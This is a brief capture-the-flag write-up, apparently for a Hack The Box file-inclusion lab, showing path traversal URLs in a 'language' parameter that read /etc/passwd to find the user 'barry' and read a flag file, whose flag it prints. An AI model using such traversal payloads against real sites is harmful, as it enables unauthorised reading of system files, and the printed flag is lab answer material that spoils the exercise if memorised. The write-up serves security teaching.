## Challenge #1

Using the file inclusion find the name of a user on the system that starts with "b".


## Solution #1

In the page there is a functionality to change the language.

I click on spanish, and it makes the url:

`http://94.237.59.180:58659/index.php?language=es.php`

I try path traversal here:

```http://94.237.59.180:58659/index.php?language=../../../../../etc/passwd`

And I got the file, and among them there is a user:

`barry:x:1000:1000::/home/barry:/bin/sh`

So the answer is `barry`.


## Challenge #2
 Submit the contents of the flag.txt file located in the /usr/share/flags directory.

 ## Solution #2
Since we have path traversal vulnerability here, I will use it to access the file.

`http://94.237.59.180:58659/index.php?language=../../../../../usr/share/flags/flag.txt`

And the contents of this file are:

`HTB{n3v3r_tru$t_u$3r_!nput}`

